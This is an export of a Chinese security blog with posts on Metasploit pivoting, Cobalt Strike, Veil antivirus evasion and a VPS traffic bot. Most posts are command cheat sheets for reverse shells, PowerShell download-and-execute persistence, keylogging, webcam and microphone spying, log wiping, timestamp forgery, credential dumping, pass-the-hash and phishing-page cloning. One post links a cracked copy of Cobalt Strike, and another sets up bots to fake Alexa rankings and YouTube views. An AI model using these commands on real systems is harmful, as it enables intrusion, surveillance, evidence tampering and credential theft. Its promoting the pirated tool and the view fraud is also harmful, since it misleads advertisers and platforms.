        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf多层内网穿透(基础篇)]]></title>
    <url>%2F2019%2F10%2F28%2Fmsfconsole%2F</url>
    <content type="text"><![CDATA[先模拟多层内网，摸清后渗透的使用，再从学校入手。内网渗透test 网络拓扑 以kali为攻击机，xp作为跳板主机，win7是内网主机 xp主机是提供web，FTP等服务，已被kali机获取shell win7正常不与外网访问，和DMZ区域处于同一网段 环境搭建使用VMware的主机模式，构建虚拟局域网。查看Host-only模式详解 虚拟网络编译器中添加两块网卡vm1，vm2。 类型：主机模式 设置xp为双网卡vm1,vm2。其余按网络拓扑分配网卡 查看ip kali xp win7 至此环境布置完毕 拿下跳板以及端口转发以社工等方法获取到xp主机的shell通过metasploit会话，使用Windows xp靶机作为跳板，扫描和攻击内部网络主机 12345678910111213141516171819202122232425262728293031323334353637383940#kali msfmsf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.252.128lhost =&gt; 192.168.252.128msf5 exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.252.128:4444 [*] Sending stage (180291 bytes) to 192.168.252.130[*] Meterpreter session 1 opened (192.168.252.128:4444 -&gt; 192.168.252.130:1814) at 2019-11-16 12:44:58 +0800meterpreter &gt; ifconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 2============Name : AMD PCNET Family PCI Ethernet Adapter - rfaceHardware MAC : 00:0c:29:dd:e6:94MTU : 1500IPv4 Address : 192.168.85.129IPv4 Netmask : 255.255.255.0Interface 3============Name : VMware Accelerated AMD PCNet Adapter - rfaceHardware MAC : 00:0c:29:dd:e6:9eMTU : 1500IPv4 Address : 192.168.252.130IPv4 Netmask : 255.255.255.0 可以看到xp是双网卡，发现另一内网段 192.168.85.0/24。 对该内网进行渗透 添加内网的路由 12meterpreter &gt; run autoroute -s 192.168.85.0/24 #添加目标网段路由规则，获取内部网络访问通道meterpreter &gt; route flush #不用的时候,记得删掉就行 扫描内网主机 1meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.85.0/24 #arp扫描粗略的扫一眼目标内网的机器大概有多少 发现 192.168.85.128的主机 socks代理 123456#利用sock4a模块对目标内网代理，只能负责tcp的流量，并不是socks代理进去以后就什么都能搞了meterpreter &gt; backgroundmsf exploit(handler) &gt; use auxiliary/server/socks4a msf auxiliary(socks4a) &gt; set srvhost 127.0.0.1msf auxiliary(socks4a) &gt; set srvport 1111msf auxiliary(socks4a) &gt; run 在proxychians.conf中设置好代理,就可以对目标进行正常的内网渗透了 12vi /etc/proxychains.conf#在文件末尾添加socks4代理服务器 利用proxychains代理扫描并执行nmap操作 1proxychains nmap -Pn -sT 192.168.85.0/24 -p1-100 发现存在80端口，google配置代理 查看 获取内网win7的shell 使用任意文件上传，获取路径 这里使用蚁剑连接 可以看到win7 开启了3389端口 这里开启并使用远程桌面 123456789# 创建新的管理员账户(直接更改管理员密码 net user Administrator 123)whoaminet usernet user wk 123 /addnet localgroup administrators wk /add #wk加入管理员账户# 使用远程桌面portfwd add -l 2222 -p 3389 -r 127.0.0.1 #先将3389流量转发到代理服务器rdesktop 127.0.0.1:2222 #kali自带rdesktop 我这里出现错误，下载的win 7的系统有问题，但是此时的用户是正常使用的。 到此时，接下来的操作大家都懂的！ 常用命令总结execute执行文件12345execute #在目标机中执行文件execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互execute -H -m -d notepad.exe -f payload.exe -a "-o hack.txt"# -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行"-o hack.txt"是payload.exe的运行参数 migrate进程迁移1234getpid # 获取当前进程的pidps # 查看当前活跃进程migrate &lt;pid值&gt; # 将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt; # 杀死进程 clearev清除日志1clearev # 清除windows中的应用程序日志、系统日志、安全日志 timestomp伪造时间戳1234timestomp C:\\ -h #查看帮助timestomp -v C:\\2.txt #查看时间戳timestomp C:\\2.txt -f C:\\1.txt #将1.txt的时间戳复制给2.txttimestomp c:\\test\\22.txt -z "03/10/2019 11:55:55" -v # 把四个属性设置为统一时间 portfwd端口转发123portfwd add -l 1111 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地1111端口rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码 autoroute添加路由1234run autoroute -h # 查看帮助run get_local_subnets # 查看目标内网网段地址run autoroute -s 192.168.183.0/24 # 添加目标网段路由run autoroute -p # 查看添加的路由 利用arp_scanner、portscan等进行扫描12run post/windows/gather/arp_scanner RHOSTS=192.168.183.0/24run auxiliary/scanner/portscan/tcp RHOSTS=192.168.183.146 PORTS=3389 Socks代理1234567use auxiliary/server/socks4aset srvhost 127.0.0.1set srvport 2000run# 然后vim /etc/proxychains.conf ，在文件末尾添加socks4代理服务器socks4 127.0.0.1 2000proxychains nmap -Pn -sT 192.168.80.129 -p1-1000 #proxychains代理访问执行nmap操作 键盘记录123keyscan_start # 开始键盘记录keyscan_dump # 导出记录数据keyscan_stop # 结束键盘记录 网络摄像头12345record_mic # 音频录制webcam_chat # 开启视频聊天(对方有弹窗）webcam_list # 查看摄像头webcam_snap # 通过摄像头拍照webcam_stream # 通过摄像头开启视频监控(以网页形式进行监控≈直播） 截屏123screenshot # 截屏use espia # 使用espia模块screengrab # 截屏 绕过UAC提权msf内置一些bypassuac脚本，原理不同，使用方法类似，执行后返回一个新的会话，执行getsystem即可提权 1234567891011exploit/windows/local/bypassuacexploit/windows/local/bypassuac_eventvwrexploit/windows/local/bypassuac_injectionexploit/windows/local/bypassuac_injection_winsxsexploit/windows/local/bypassuac_silentcleanupexploit/windows/local/bypassuac_vbsuse exploit/windows/local/bypassuacset session 1rungetsystem 窃取hash及密码&amp;哈希传递123456789101112131415161718192021222324252627# 窃取hash及密码hashdumprun post/windows/gather/smart_hashdump得到的hash可以拿去https://cmd5.com/ 解密一下即是用户密码#mimikatzload mimikatz # 加载mimikatz模块msv # 获取用户和hash值 kerberos # 获取内存中的明文密码信息wdigest # 获取内存中的明文密码信息mimikatz_command -f a:: # 需要以错误的模块来让正确的模块显示mimikatz_command -f sekurlsa::searchPasswords # 获取用户密码mimikatz_command -f samdump::hashes # 执行用户hash#哈希传递#利用hashdump得到用户的hash后可利用psexec模块进行哈希传递攻击。使用psexec的前提：SMB服务必须开启，也就是开启445端口；Admin$可以访问use exploit/windows/smb/psexecset payload windows/meterpreter/reverse_tcpset LHOST 192.168.183.147set LPORT 443set RHOST 192.168.183.154set SMBUSER Administratorset SMBPASS ccf**4ee:3db**678set SMBDOMAIN WORKGROUP # 域用户需要设置SMBDOMAINrun RDP123456789101112131415161718192021#getgui命令#这里需要注意的是通过getgui命令，虽然可以成功添加用户，但是没有权限远程登录桌面，这里推荐使用enable_rdp脚本添加。run getgui –h # 查看帮助run getgui -e # 开启远程桌面run getgui -u admin -p admin # 添加用户run getgui -f 6666 -e # 3389端口转发到6666#enable_rdp脚本#通过enable_rdp脚本将用户添加到远程桌面用户组和管理员用户组run post/windows/manage/enable_rdp #开启远程桌面run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=admin # 添加用户run post/windows/manage/enable_rdp FORWARD=true LPORT=6667 # 将3389端口转发到6667#远程桌面enumdesktops # 查看可用的桌面getdesktop # 获取当前meterpreter 关联的桌面setdesktop # 设置meterpreter关联的桌面 -h查看帮助run vnc # 使用vnc远程桌面连接rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码 后门植入12345678910# Persistence(通过启动项安装)run persistence –h # 查看帮助run persistence -X -i 5 -p 4444 -r 192.168.183.147 run persistence -U -i 5 -p 4444 -r 192.168.183.147 -L c:\\Windows\\System32-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限原因会导致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息-L：后门传到远程主机的位置默认为%TEMP%-i：设置反向连接间隔时间为5秒-p：设置反向连接的端口号-r：设置反向连接的ip地址]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[懒人处理闲置vps__ubuntu16.04]]></title>
    <url>%2F2019%2F10%2F26%2F%E6%87%92%E4%BA%BA%E5%A4%84%E7%90%86%E9%97%B2%E7%BD%AEvps%2F</url>
    <content type="text"><![CDATA[今天刚好看b站，看到视频闲置的vps赚美刀。正好自己手里有闲置的阿里云Ecs，就趁机回收一下主机成本，也好久不碰vps了，上手试试。 0x01 关于平台Alexamaster，是一家通过全自动挂机刷Alexa排名的网站，通过浏览器可以自动冲浪上网挂机，起付金额最低1$,有PAYPAL即可，国内可挂。 Vagex 是刷 youtube 点击量的平台，支持最多 5 个 ip 挂同一个账号，即可以 5 台机器同时进行，平均每月赚 1-5 刀。 Ebesucher 是刷网站访问量的挂机平台，是一家德国的公司，用欧元支付。大约每月 1 欧左右。 一开始就接触的Alexamaster，下面都以它为例 0x02 Alexamaster注册无需翻墙点击进入 填写资料，建议google邮箱。confire email可以在垃圾箱中找到。 注册之后找到挂机地址autosurf url Earn Points - AutoSurf - how - copy autosurf url 此时，在浏览器中打开网址就可挂机赚钱了。如图 0x3 vps_ubuntu安装VNC服务器并启用12345#阿里云服务器ubuntu 16.04版本root@iZuf6cicjbwbqh7486tzi8Z:~# apt-get install vnc4server # 安装VNC服务器root@iZuf6cicjbwbqh7486tzi8Z:~# vncserver # 第一次运行vncserver设置VNC密码，看到类似 “New ‘:1 ()’ desktop is :1 (代表主机名）” 的信息，即表示启动 vnc 成功root@iZuf6cicjbwbqh7486tzi8Z:~# vncserver :1 #开启端口5901root@iZuf6cicjbwbqh7486tzi8Z:~# ufw allow 5901 #阿里云防火墙开启端口并进行安全组进行设置 客户机中下载vnc viewerwindows下载vnc viewer 通过vps的ip+vnc的序号连接 配置完整的桌面VNC12345678#连接上是一个空白的灰色屏幕，因为服务器的桌面进程尚未启动root@iZuf6cicjbwbqh7486tzi8Z:~# vncserver -kill :1 #成功连接之后，再退出该连接。关闭VNC服务：root@iZuf6cicjbwbqh7486tzi8Z:~# apt-get install --no-install-recommends ubuntu-desktop gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal -y #安装并使用 unity 桌面，这里仅安装核心组件(精简够用) /完整版桌面：apt install ubuntu-desktop gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal -yroot@iZuf6cicjbwbqh7486tzi8Z:~# cp ~/.vnc/xstartup ~/.vnc/xstartup.bak #备份原有 xstartup 文件root@iZuf6cicjbwbqh7486tzi8Z:~# vi ~/.vnc/xstartup配置修改如下图所示，红色部分root@iZuf6cicjbwbqh7486tzi8Z:~# vncserver :1 #保存并退出文件。重新启动VNC会话 VNC服务器自启动123root@iZuf6cicjbwbqh7486tzi8Z:~# crontab -e #打开crontab，选择编译器4@reboot /usr/bin/vncserver :1 #添加到文件的底部保存并退出文件 使用windows下连上VNC Viewer，挂上自动冲浪网址 此时已经完成 优化firefox 将浏览器更新到最新的Firefox，推荐Firefox 在浏览器中禁用弹出窗口阻止程序（必须启用JavaScript / Cookies 取消阻止内容阻止程序 安装Alexa浏览器扩展: alexa-com-toolbar 关闭 Firefox 的浏览记录 关闭 Firefox 安装提示 国内挂了一会会让你重置ip，推荐使用vpn，浏览器设置代理。点击此处 123456#定时重启Firefoxroot@iZuf6cicjbwbqh7486tzi8Z:~# crontab -e#在结尾附加0 * * * * rm -rf /root/.vnc/*.log &amp;&gt; /dev/null*/20 * * * * killall -9 firefox &amp;&gt; /dev/null*/20 * * * * sleep 30; export DISPLAY=:1; firefox &amp;&gt; /dev/null 开启Swap空间开启Swap虚拟内存 1234567root@iZuf6cicjbwbqh7486tzi8Z:~# swapon -s #查看当前是否开启Swap空间，结果为空则未开启root@iZuf6cicjbwbqh7486tzi8Z:~# fallocate -l 2G /swapfile &amp;&amp; chmod 600 /swapfile &amp;&amp; mkswap /swapfile &amp;&amp; swapon /swapfile #输入命令创建并启用 Swap 文件root@iZuf6cicjbwbqh7486tzi8Z:~# vim /etc/fstab #最后一行添加以下命令，设置开机自启/swapfile none swap defaults 0 0#删除Swap文件 root@iZuf6cicjbwbqh7486tzi8Z:~# swapoff -aroot@iZuf6cicjbwbqh7486tzi8Z:~# rm -rf /swapfile 推荐的一些github上一键部署脚本点击此处 后记这里贴一下VNC Server命令 12345678910111213141516171819#登陆root@iZuf6cicjbwbqh7486tzi8Z:~# vncserver :2 设置客户端连接端口，一般端口号码在5901 ~ 5910 之间#停止root@iZuf6cicjbwbqh7486tzi8Z:~# vncserver -kill :2 只能使用kill暴力杀除命令#同一个显示器可以连接多个客户机root@iZuf6cicjbwbqh7486tzi8Z:~# vncserver -alwaysshared#重启服务root@iZuf6cicjbwbqh7486tzi8Z:~# service vncserver restart#重置密码root@iZuf6cicjbwbqh7486tzi8Z:~# rm /root/.vnc/passwd # 重新进行初次登陆的设置[破解vnc密码](https://github.com/x0rz4/vncpwd)点击[强化vnc server默认密码连接，免VNC端口(5901)](https://hakula.xyz/tutorial/vagex.html)#ssh隧道传输VNC，加密发送所有数据#SSH创建仅通过默认SSH端口（22）将本地端口5901上的localhost转发到远程计算机的端口5901的本地隧道]]></content>
      <categories>
        <category>vps</category>
      </categories>
      <tags>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CobaltStrike学习六]]></title>
    <url>%2F2019%2F10%2F18%2FCobaltStrike%E5%AD%A6%E4%B9%A0%E5%85%AD%2F</url>
    <content type="text"><![CDATA[使用cs进行钓鱼攻击。 cs获取靶机权限从下图开始 进入beacon console 设置心跳时间0 克隆我们的网站 Attacks-&gt;web driver by -&gt;clone site 重点要勾选键盘记录(红色框框，不然web_log里看不到) clone之后，在win7机上打开 如果受害者输入了用户名123，密码test123 我们可以在view中查看Web Log]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CobaltStrike学习五]]></title>
    <url>%2F2019%2F10%2F16%2FCobaltStrike%E5%AD%A6%E4%B9%A0%E4%BA%94%2F</url>
    <content type="text"><![CDATA[在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。 12345671.注册表2.启动项3.计时任务4.设置服务5.shift后门6.dll劫持(白加黑)7.利用其他安装的软件 设置powershell脚本开机自启动后门点击Attacks-&gt;web driver-by -&gt;script web delivery 点击launch后出现如下将其复制到靶机的cmd运行即可 1powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.1.1.100:81/a'))" 此时拿到了普通用户权限的beacon，首先提权到system权限 打开beacon shell后输入： 1shell sc create "name" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.100:81/a'))\"" 切换到靶机，查看服务，在服务中找到了名为name的项 注意到此时启动类型还是手动，我们设置为自动回到beacon shell输入以下命令即可 1shell sc config "name" start= auto 在服务中右键-》刷新 设置服务的描述字符串shell sc description “name” “description” 再次刷新，可以看到此时在name的属性中看到了描述为description 接下来启动服务 shell net start “name” 然后重启靶机此时看到已有的会话已经失去了连接 不过通过powershell留开机自启动服务，当目标主机重启电脑之后,不断向攻击机器发送请求数据包，重新拿到控制权限 通过service留自启动后门，生成一个exe后门Attacks-&gt;packages-&gt;windows executable 保存即可,然后右键explore&gt;file browser 把生成的exe程序上传到靶机选择我们想要的路径，这里以C:\windows为例 点击upload，选择artifact.exe 点击打开即可在靶机上就能看到了 创建项及路径shell sc create “server power” binpath= “C:\Windows\artifact.exe” 12345设置服务的描述字符串shell sc description "server power" "description"设置服务为自启动shell sc config "server power" start= auto 然后启动服务shell net start “server power” 也可以直接向注册表写开机启动项还是用上一步生成的木马程序 1shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "keyname" /t REG_SZ /d "C:\Windows\artifact.exe" /f 切换到靶机，打开注册表 靶机重启之后，在cs同样是自动拿到了控制权限]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CobaltStrike学习四]]></title>
    <url>%2F2019%2F10%2F16%2FCobaltStrike%E5%AD%A6%E4%B9%A0%E5%9B%9B%2F</url>
    <content type="text"><![CDATA[CobaltStrike之提权及spawn 1 提权获取beacon 1.1 elevate-kit提权查看cs自带的漏洞库 1.2 导入cna文件丰富我们的漏洞库 点击左上角cobalt strike-&gt;script manager 点击load，找到下载的ElevateKit工具路径，选择cna文件 选中elevate.cna点击‘打开’然后回到beacon shell，再次输入elevate 1.3 选择exp进行提权右键-&gt;access-&gt;elevate 1.4 使用ms16-032成功,获得管理员权限 2.Spawn什么是spawn 简单理解,所谓的派生,即仅仅通过一个beacon shell就可以再孵化出n个shell,shell与shell之间相当于以一种级联的形式存在的 这样一种场景：假如你同事跟你说，他需要你那个目标的shell，但又不想直接连到你的团队服务器上。事实上，这个场景非常常见，cs针对这种场景的解决办法就是：让他直接在他本地起一个团队服务器创建个监听器，然后你再用你的cobaltstrike客户端连到他的团队服务器上，最后，把他要那个目标的shell派生到他指定的那个监听器上即可。 2.1切换另一台kali，启动teamserver 然后在这台kali上启动一个客户端 可以看到此时是没有beacon 创建一个listener 2.2切换到第一台kali在上一台已经拿到beacon的客户端上，创建新的连接，连接到.150这台kali启动的teamserver上点击左上角，cobalt strike-&gt;new connection Host填.150那台kali，点击connect 此时在左下角我们可以看到，在客户端这儿是可以切换两台teamserver的 我们切换到neo@127.0.0.1选中一个beacon，右键spawn然后选中在.150的cs客户端上创建的listener点击choose即可 2.3切换.150的cs客户端可以看到此时已经收到.100的cs客户端spawn来的beacon了]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CobaltStrike学习三]]></title>
    <url>%2F2019%2F10%2F16%2FCobaltStrike%E5%AD%A6%E4%B9%A0%E4%B8%89%2F</url>
    <content type="text"><![CDATA[能够与metasploit配合，可以相互派生shell，学会团队作战的理念，能够使用CS的协作功能。 Cobalt strike派生shell给metasploit 前提有一个beaconshell 在metasploit处创建一个handler 使用cobaltstrike创建一个listener这里port设置为创建msf的handler时的port 利用已获得的beaconshell传给msfchose 选择 msf这个listener 这里我没有成功，cs传给metasploit失败。没找到原因 metasploit派生shell给cobaltstrike 前提是有一个metasploit的session 删除之前的记录。先在cobaltstrike创建一个listener，用于接收msf的派生shellcobaltstrike创建一个listener metasploit获取session生成metasploit的木马 开启监听 利用web服务开启渠道，选择之前生成的恶意文件test.exe win7下载testexe,获得session cs获得meta的shell1234567meterpreter &gt; backgroundmsf5 exploit(multi/handler) &gt; use exploit/windows/local/payload_injectmsf5 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_httpmsf5 exploit(windows/local/payload_inject) &gt; set lhost 10.1.1.100msf5 exploit(windows/local/payload_inject) &gt; set lport 7777msf5 exploit(windows/local/payload_inject) &gt; set session 1msf5 exploit(windows/local/payload_inject) &gt; run 此时cobaltstrike 已经获得metasploit的shell]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CobaltStrike学习二]]></title>
    <url>%2F2019%2F10%2F09%2FCobaltStrike%E5%AD%A6%E4%B9%A0%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[了解CobaltStrike的功能，深入理解各个功能模块的含义及使用，能够根据具体情况调用不同模块来使用 Cobalt Strike模块New Connection connection 新建立一个用户连接，即连接到一个新的teamserver上 Preferences 配置自己的设置，还记得我们第二次连接服务端的时候不用校验hash吗，就是因为hash已经被缓存在这儿了 Visualization可视化 pivot graph 控制主机视图 session table 一个会话 Target table 目标表 Vpn lnterfacesVpn lnterfaces vpn接口，一般在公网环境下很实用 listeners建立个反弹shell的监听器 Script managerScript manager 用于脚本管理，我们前面提到CS可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等。 AttacksPackages 生成恶意文件 HTML Application 生成hta文件 MS Office Macro 宏office文件 Payload Generator 生成各种语言版本的payload USB/CD AutoPlay 利用自动播放运行的被控端文件 Windows Dropper 捆绑器可将任意正常的文件 Windows Executable payload 生成可执行文件 (一般使用这个) Windows Executable (S) 把包含payload,Stageless生成可执行文件(包含多数功能)Web Drive-by 创建一个渠道，能够让靶机下载执行生成的恶意文件 CS支持的方式包括： Manage 开启的所有web服务 Clone Site 克隆网站 Host File 提供Web以供下载某文件 Scripted Web Delivery 为payload提供web服务以便于下载和执行 Signed Applet Attack 启动一个Web服务以提供自签名JavaApplet的运行环境 Smart Applet Attack 自动检测Java版本并利用已知的exploits绕过security System Profiler 获取系统，Flash，浏览器版本等 我们是通过web的方式，在靶机上执行下载命令完成的SpearPhish 即鱼叉式网络钓鱼 beacon命令右键interact可以开启beacon，我们用它来执行各种命令 查看怎么使用哪些命令，可以使用help 注意，在Cobalt Strike中它的心跳默认是60s，默认60s一次回传，这会让我们执行的命令响应很慢，在下载文件面前更为明显，所以实验时会把时间降低一点。但是在实战时应根据实战环境来调节，建议不要太快，不然流量特征会过于明显，容易暴露自己。 我这里设置为如下，让靶机每5s下载一次任务 Access事实上，右键打开的不止interact Interact 打开beaconAccess dumphashes 获取hash Elevate 提权 GoldenTicket 生成黄金票据注入当前会话 MAketoken 凭证转换 RunMimikatz 运行 Mimikatz SpawnAs 用其他用户生成CobaltStrike侦听器Explore BrowserPivot 劫持目标浏览器进程 Desktop(VNC) 桌面交互 FileBrowser 文件浏览器 NetView 命令Net View Portscan 端口扫描 Processlist 进程列表 Screenshot截图Pivoting SOCKSServer 代理服务 Listener 反向端口转发 DeployVPN 部署VPNSpawn 新的通讯模式并生成会话 Session 会话管理，删除，心跳时间，退出，备注 View Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本 Credentials 显示所有已经获取的用户主机hash Downloads 显示下载的文件 Event log 事件日志记录团队 目标上线等记录 Keystrokes 目标键盘记录 Proxy Pivots 代理信息 Screenshots 屏幕截图 Script Console 加载自定义脚本 Targets 显示所有主机 Web log web服务日志 这些选项直接打开是没有用的，得在beacon中执行相应命令后才能使用，之前演示了screenshot，这里示范个经典的动作--获取hash，不过需要administrator权限，所以顺便演示一下使用CS提权，右键-》access-&gt;elevate 会自动选择合适的exp，点击launch即可，此时在日志中可以看到已经拿到system权限了 现在我们有2个会话，一个yale，一个system 我们这时候需要和system交互，所以还是同样在system上右键-》interact输入hashdump 这些结果都被缓存在了view-&gt;credentials 最后一步是生成报告 Activity report 活动报告 Hosts report 主机报告 Indicators of Compromise 威胁报告 Sessions report 会话报告 Social engineering report 社会工程学报告生成新鲜的威胁报告还是同样的方法使用默认名，默认路径生成]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CobaltStrike学习一]]></title>
    <url>%2F2019%2F10%2F08%2FCobaltStrike%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%2F</url>
    <content type="text"><![CDATA[一次完整的渗透试验，熟悉cs的基本使用 启动服务端-》在客户端连接服务端-》创建listener-》创建攻击载荷-》投递载荷-》靶机下载执行-》靶机上线-》拿到shell-》生成渗透测试报告。 启动服务端我是建在阿里云的vps上，搭建cobaltstrike里有介绍 客户端连接同样在搭建的文章里介绍了 创建listener 左上角Cobaltstrike–&gt; listeners 右下角菜单栏有add，添加新listener Host为kali本机的ip name随意，payload主要分为beacon和foreign两大类 Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上；其中包含DNS、HTTP、SMB。 Foreign为外部结合的Listener，常用于MSF的结合save生成，并点击确定 此时，listener出现一条记录 创建攻击载荷 攻击途径 Attacks–&gt;HTML Application 选择攻击方法 PowerShell 点击generate生成，文件路径和文件名随意 投递载荷 Attacks–&gt;Web Drive-by–&gt;Host File file选择前面生成的hta的文件路径 点击launch生成链接 靶机下载执行win7 sp1，cmd,执行mshta命令，mshta使用来执行.HTA文件 靶机上线在kali中可以看到肉鸡上线，event log中有相关日志]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CobaltStrike安装]]></title>
    <url>%2F2019%2F10%2F07%2FCobaltStrike%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Cobalt Strike 一款以 metasploit 为基础的 GUI 的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。 前言下载 Cobalt Strike 3.14破解版本 https://pan.baidu.com/s/1KaZtM7F8sV21Zd1q5upkMw 密码：2oij 申请适用版会很麻烦，就直接贴出来 服务器端安装与运行Cobalt Strike3.0 需要开启团体服务器才可以链接使用，当然，这个服务器可以放到公网环 境下，或者放到自己想要搭建此服务的环境中。 在使用 Cobalt Strike 之前，需要安装 java 环境，具体怎么配置，请移步 java 环境搭建 将Cobalt Strike上传到vps上，解压 123运行服务端：./teamserver 139.196.87.221 password 服务器IP 和 客户端连接密码运行服务端：nohup ./teamserver 139.196.87.221 password &amp; 放入后台运行 修改Cobalt Strike的默认端口 客户端运行服务运行以后，在客户端进行连接： ./cobaltstrike 这里 ip 使用服务器的 ip，端口修改为55555，用户名随意，密码为之前设置的密码，然后 connect, 弹出验证窗口，然后点是，就 进入 Cobalt Strike 了。 谈谈安装时的坑首先 这个Cobalt Strike3以上版本真的很难找，你去官网下载现在还下载不了，网上绝大数分享也都已经失效 其次：在服务器端的java环境要换成Oracle jdk 1.8 版本,否则无法完成编译，客户端connect是也会出现超时的情况]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[veil制作免杀payload]]></title>
    <url>%2F2019%2F10%2F05%2F%E5%85%8D%E6%9D%80veil%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[简介:Veil3.0可以将任意脚本或一段shellcode转换成Windows可执行文件，从而逃避了常见防病毒产品的检测，来自python3的Veil一直在更新。 kali安装12root@kali:~# apt -y install veilroot@kali:~# /usr/share/veil/config/setup.sh --force --silent 使用说明 在Kali上运行Veil，生成payload 如果使用的是Pyinstaller，payload会转成能够直接使用的可执行程序 如果使用的是Py2Exe，把payload.py和两个相关的文件放到windows系统上。执行批处理脚本将payload转换成可执行程序。 工具使用启动veil 有两个免杀的工具，Evasion和Ordnance。 Ordnance可生成在Veil-Evasion中使用的shellcode Evasion是用做文件免杀我们选择Evasion12Veil&gt;: use 1 #选择Evasion功能Veil/Evasion&gt;: list #查看payload列表 查看payload 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152[*] Available Payloads: 1) autoit/shellcode_inject/flat.py 2) auxiliary/coldwar_wrapper.py 3) auxiliary/macro_converter.py 4) auxiliary/pyinstaller_wrapper.py 5) c/meterpreter/rev_http.py 6) c/meterpreter/rev_http_service.py 7) c/meterpreter/rev_tcp.py 8) c/meterpreter/rev_tcp_service.py 9) cs/meterpreter/rev_http.py 10) cs/meterpreter/rev_https.py 11) cs/meterpreter/rev_tcp.py 12) cs/shellcode_inject/base64.py 13) cs/shellcode_inject/virtual.py 14) go/meterpreter/rev_http.py 15) go/meterpreter/rev_https.py 16) go/meterpreter/rev_tcp.py 17) go/shellcode_inject/virtual.py 18) lua/shellcode_inject/flat.py 19) perl/shellcode_inject/flat.py 20) powershell/meterpreter/rev_http.py 21) powershell/meterpreter/rev_https.py 22) powershell/meterpreter/rev_tcp.py 23) powershell/shellcode_inject/psexec_virtual.py 24) powershell/shellcode_inject/virtual.py 25) python/meterpreter/bind_tcp.py 26) python/meterpreter/rev_http.py 27) python/meterpreter/rev_https.py 28) python/meterpreter/rev_tcp.py 29) python/shellcode_inject/aes_encrypt.py 30) python/shellcode_inject/arc_encrypt.py 31) python/shellcode_inject/base64_substitution.py 32) python/shellcode_inject/des_encrypt.py 33) python/shellcode_inject/flat.py 34) python/shellcode_inject/letter_substitution.py 35) python/shellcode_inject/pidinject.py 36) python/shellcode_inject/stallion.py 37) ruby/meterpreter/rev_http.py 38) ruby/meterpreter/rev_https.py 39) ruby/meterpreter/rev_tcp.py 40) ruby/shellcode_inject/base64.py 41) ruby/shellcode_inject/flat.py 推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。 选择go语言stager1Veil/Evasion&gt;: use 17 生成一个包含并执行CSpayload的go语言代码，和该代码编译成的可执行文件 123456789101112131415161718Required Options:Name Value Description---- ----- -----------BADMACS FALSE #查看运行环境的MAC地址(反调试)CLICKTRACK X #点击次数才会执行COMPILE_TO_EXE Y #编译成exe文件CURSORCHECK FALSE #设置硬盘容量(反沙盒)DISKSIZE X # 设置只有磁盘大小满足时执行 